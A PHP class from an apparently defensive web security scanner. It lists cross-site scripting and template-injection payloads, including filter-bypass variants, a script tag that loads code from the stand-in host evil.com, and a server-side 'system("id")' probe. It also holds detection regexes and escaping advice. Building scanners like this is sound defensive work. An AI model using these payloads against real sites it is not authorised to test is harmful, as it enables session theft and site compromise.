<?php

declare(strict_types=1);

namespace BEAR\Security\Dast\Payload;

use BEAR\Security\VulnerabilityInterface;

/**
 * Cross-Site Scripting (XSS) attack payloads
 */
final class XssPayload implements PayloadInterface
{
    public function getName(): string
    {
        return 'Cross-Site Scripting (XSS)';
    }

    /** @return string[] */
    public function getPayloads(): array
    {
        return [
            // Basic script injection
            '<script>alert(1)</script>',
            '<script>alert("XSS")</script>',
            '<script src="http://evil.com/xss.js"></script>',

            // Event handlers
            '<img src=x onerror=alert(1)>',
            '<img src="x" onerror="alert(1)">',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror="alert(1)">',

            // href/src injection
            '<a href="javascript:alert(1)">click</a>',
            '<iframe src="javascript:alert(1)">',

            // Encoded payloads
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',

            // Bypass attempts
            '<ScRiPt>alert(1)</ScRiPt>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",

            // SVG-based
            '<svg/onload=alert(1)>',
            '<svg><script>alert(1)</script></svg>',

            // Data URI
            '<object data="data:text/html,<script>alert(1)</script>">',

            // Template injection (for template engines)
            '{{constructor.constructor("alert(1)")()}}',
            '${alert(1)}',
            '<%= system("id") %>',
        ];
    }

    /** @return string[] */
    public function getSuccessPatterns(): array
    {
        return [
            // Script tags reflected
            '/<script[^>]*>.*?<\/script>/is',

            // Event handlers reflected
            '/\bon\w+\s*=/i',

            // javascript: protocol
            '/javascript\s*:/i',

            // Specific payloads reflected unescaped
            '/<img[^>]+onerror/i',
            '/<svg[^>]+onload/i',
            '/<iframe[^>]+src\s*=\s*["\']?javascript/i',
        ];
    }

    public function getSeverity(): string
    {
        return VulnerabilityInterface::SEVERITY_HIGH;
    }

    public function getDescription(): string
    {
        return 'Cross-Site Scripting (XSS) vulnerability detected - malicious scripts can be injected';
    }

    public function getRecommendation(): string
    {
        return 'Escape all user input before output using htmlspecialchars($input, ENT_QUOTES, "UTF-8"). Use Content-Security-Policy headers.';
    }
}
